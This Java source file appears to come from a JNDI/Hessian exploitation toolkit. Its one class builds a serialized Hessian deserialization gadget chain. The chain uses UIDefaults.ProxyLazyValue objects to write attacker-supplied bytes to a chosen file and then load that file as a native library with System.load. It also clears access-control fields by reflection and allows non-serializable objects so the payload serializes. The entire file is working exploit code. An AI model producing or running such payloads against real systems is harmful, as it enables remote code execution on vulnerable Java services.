package map.jndi.gadget;

import com.caucho.hessian.io.Hessian2Output;
import map.jndi.util.ReflectUtil;

import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

public class HessianGadgets {
    public static byte[] loadLibrary(String fileName, byte[] content) throws Exception {
        UIDefaults.ProxyLazyValue proxyLazyValue1 = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{fileName, content});
        UIDefaults.ProxyLazyValue proxyLazyValue2 = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{fileName});

        ReflectUtil.setFieldValue(proxyLazyValue1, "acc", null);
        ReflectUtil.setFieldValue(proxyLazyValue2, "acc", null);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", proxyLazyValue1);
        u2.put("aaa", proxyLazyValue1);

        HashMap map1 = makeMap(u1, u2);

        UIDefaults u3 = new UIDefaults();
        UIDefaults u4 = new UIDefaults();
        u3.put("bbb", proxyLazyValue2);
        u4.put("bbb", proxyLazyValue2);

        HashMap map2 = makeMap(u3, u4);

        HashMap map = new HashMap();
        map.put(1, map1);
        map.put(2, map2);

        return serialize2(map);
    }

    private static HashMap<Object, Object> makeMap(Object v1, Object v2) throws Exception {
        HashMap<Object, Object> map = new HashMap<>();
        Method putValMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);
        putValMethod.setAccessible(true);
        putValMethod.invoke(map, 0, v1, 123, false, true);
        putValMethod.invoke(map, 1, v2, 123, false, true);
        return map;
    }

    private static byte[] serialize2(Object o) throws Exception {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(bao);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(o);
        output.flush();
        return bao.toByteArray();
    }
}
